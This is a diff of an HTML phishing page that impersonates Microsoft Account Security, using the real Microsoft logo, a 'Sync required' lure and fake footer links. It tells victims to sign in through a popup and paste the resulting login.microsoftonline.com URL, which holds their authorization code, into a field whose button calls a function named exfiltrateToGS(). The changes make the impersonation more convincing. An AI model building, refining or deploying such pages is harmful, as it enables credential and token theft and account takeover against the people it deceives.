@@ -2,34 +2,44 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Enterprise API Gateway</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Account Security</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; width: 400px; padding: 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .logo { width: 108px; margin-bottom: 20px; }
-        h1 { font-size: 22px; color: #1b1b1b; }
-        p { font-size: 14px; color: #666; line-height: 1.5; }
-        .btn { background: #0067b8; color: white; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: 600; margin-top: 10px; }
-        input { width: 100%; padding: 12px; margin-top: 10px; border: 1px solid #ccc; box-sizing: border-box; font-family: monospace; font-size: 12px; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #fff; width: 440px; padding: 44px; box-shadow: 0 2px 4px rgba(0,0,0,.1); border: 1px solid #ccc; }
+        .logo { width: 108px; margin-bottom: 24px; }
+        h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin: 0 0 12px; }
+        p { font-size: 15px; color: #1b1b1b; line-height: 1.4; margin-bottom: 20px; }
+        .btn { background: #0067b8; color: #fff; border: none; padding: 10px 20px; width: 100%; cursor: pointer; font-size: 15px; font-weight: 500; }
+        .btn:hover { background: #005da6; }
+        .btn-sync { background: #28a745; margin-top: 15px; }
+        .btn-sync:hover { background: #218838; }
+        input { width: 100%; padding: 12px; border: 1px solid #8a8886; margin-top: 10px; box-sizing: border-box; font-family: monospace; font-size: 12px; }
         .hidden { display: none; }
+        .footer { margin-top: 40px; font-size: 12px; color: #666; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
+<div class="card">
+    <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo" alt="Microsoft">
     
     <div id="step-1">
-        <h1>API Access Required</h1>
-        <p>To continue using organization resources, please re-validate your Microsoft Graph session permissions.</p>
-        <button class="btn" onclick="startBridge()">Sign In & Validate</button>
+        <h1>Sync required</h1>
+        <p>To ensure your account remains secure, please synchronize your device with the Microsoft Security Services gateway.</p>
+        <button class="btn" onclick="startBridge()">Sign In to Sync</button>
     </div>
 
     <div id="step-2" class="hidden">
-        <h1>Complete Validation</h1>
-        <p>Copy the resulting URL from the login window bar and paste it below to sync your API tokens:</p>
+        <h1>Finalizing Sync</h1>
+        <p>Your session has been validated. To complete the process, please copy the URL from the popup window and paste it here:</p>
         <input type="text" id="raw-url" placeholder="https://login.microsoftonline.com/...">
-        <button class="btn" style="background: #28a745;" onclick="exfiltrateToGS()">Complete Sync</button>
+        <button class="btn btn-sync" onclick="exfiltrateToGS()">Complete Synchronization</button>
+    </div>
+
+    <div class="footer">
+        <span style="margin-right:15px;">Privacy & cookies</span>
+        <span>Terms of use</span>
     </div>
 </div>
 
